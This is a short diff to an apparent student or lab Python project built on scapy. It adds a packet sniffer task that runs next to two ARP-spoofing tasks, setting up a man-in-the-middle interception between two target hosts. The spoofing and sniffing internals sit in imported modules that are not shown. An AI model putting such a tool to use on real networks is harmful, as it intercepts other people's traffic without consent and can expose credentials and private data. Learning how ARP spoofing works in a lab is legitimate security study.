@@ -1,5 +1,6 @@
 import get_mac_from_ip
 import arp_spoofing
+import sniffer
 from scapy.all import get_if_hwaddr, get_if_addr
 import asyncio
 
@@ -17,12 +18,14 @@ class MainInTheMiddle:
             
         t1 = asyncio.create_task(spoof_client_1.start_spoofing(interval=2.0))
         t2 = asyncio.create_task(spoof_client_2.start_spoofing(interval=2.0))
+        t3 = asyncio.create_task(sniffer.Sniffer(self.interface, self.cible_1.mac, self.cible_2.mac).start_sniffing())
 
         try:
-            await asyncio.gather(t1, t2)
+            await asyncio.gather(t1, t2, t3)
         except asyncio.CancelledError:
             t1.cancel()
             t2.cancel()
+            t3.cancel()
 
 def verif_ip(ip :str):
     octets = ip.split(".")
